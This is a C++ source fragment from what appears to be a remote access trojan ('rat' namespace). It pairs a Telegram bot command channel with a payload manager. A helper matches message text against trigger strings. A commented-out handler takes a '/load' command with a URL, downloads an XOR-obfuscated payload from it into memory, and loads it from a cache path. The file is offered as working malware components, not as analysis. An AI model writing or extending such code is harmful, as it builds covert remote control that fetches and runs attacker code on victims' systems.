//#include "special_handler.hpp"
#include <algorithm>
#include <cstring>
#include <string>
#include <cstdint>
#include "rat/networking.hpp"
#include "rat/system.hpp"
#
#include "rat/tbot/handler/handleUpdate.hpp" //for the rat::Command type and the Command _parseTelegramMessageToCommand(const Message& Telegram_Message);
namespace rat {

bool _isPayloadManagerInvoked(const std::string& Message_Text, const std::array<std::string, 4>& arg_Invocations) {
    for(const auto& invocation: arg_Invocations) {
        if(strncmp(Message_Text.c_str(), invocation.c_str(), invocation.size() ) == 0) {
            return true;
        }
    }
    return false;
}

/*
void handleSpecialUpdate(rat::tbot::Update& arg_Update, rat::payload::PayloadManager& Payload_Manager, std::string& arg_Response) {
    rat::tbot::Message message= arg_Update.message;
    rat::Command command = rat::tbot::handler::_parseTelegramMessageToCommand(message);

    if( (command.directive == "/load") && (command.parameters.size() == 2)) {
        const std::string key = command.parameters[0];
        const std::string url = command.parameters[1];

        std::vector<uint8_t> buffer;
        buffer.reserve(1024 * 1024);
        bool in_memory = rat::networking::downloadDataObfuscatedWithXor(url,
                                                                        buffer,
                                                                        Payload_Manager.xor_key);

        if(!in_memory){
            arg_Response = "failed to download or to load to memory";
            return;
        }
        const inline std::filesystem::path not_so_random_path = Payload_Manager.cache_dir / rat::system::_getRandomPath();
        Payload_Manager.load(key, not_so_random_path);
    }

}
    */
}
